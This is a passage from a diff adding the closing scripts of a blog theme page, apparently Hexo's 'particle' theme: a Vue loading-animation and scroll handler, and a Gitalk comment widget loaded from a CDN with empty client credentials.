+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'zh-CN',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+
+
+</body></html>
